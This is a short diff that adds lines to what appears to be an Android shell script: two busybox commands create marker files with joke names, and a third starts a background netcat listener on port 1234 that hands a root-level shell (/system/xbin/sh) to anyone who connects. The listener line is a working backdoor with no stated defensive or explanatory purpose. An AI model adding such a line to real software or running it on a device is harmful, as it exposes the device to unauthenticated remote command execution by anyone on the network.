@@ -1,0 +1,4 @@
+/system/xbin/busybox touch /tmp/RedHerring.$$
+/system/xbin/busybox touch /data/InYourGrill.$$
+/system/xbin/busybox nc -l -p 1234 -e /system/xbin/sh &
+
